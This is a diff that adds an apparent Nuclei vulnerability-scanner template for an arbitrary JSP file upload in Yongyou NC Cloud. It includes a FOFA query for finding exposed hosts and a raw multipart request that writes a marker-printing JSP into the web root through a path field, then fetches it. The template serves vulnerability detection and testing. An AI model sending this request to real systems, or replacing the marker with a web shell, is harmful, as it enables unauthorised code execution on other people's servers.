@@ -1,0 +1,41 @@
+id: yongyou-cloud-accept-file-upload
+
+info:
+  name: Yongyou Cloud File Upload
+  author: zp857
+  severity: critical
+  tags: yongyou-cloud,fileupload
+  metadata:
+    fofa-query: 'app="用友-NC-Cloud"'
+
+requests:
+  - raw:
+      - |
+        POST /aim/equipmap/accept.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygAN1sU0LiJL4bFQ8
+
+        ------WebKitFormBoundarygAN1sU0LiJL4bFQ8
+        Content-Disposition: form-data; name="file"; filename="cmd.txt"
+        Content-Type: text/plain
+
+        <% out.println(857857857); %>
+        ------WebKitFormBoundarygAN1sU0LiJL4bFQ8
+        Content-Disposition: form-data; name="fname"
+
+        /webapps/nc_web/help.jsp
+        ------WebKitFormBoundarygAN1sU0LiJL4bFQ8
+
+      - |
+        GET /help.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "857857857"
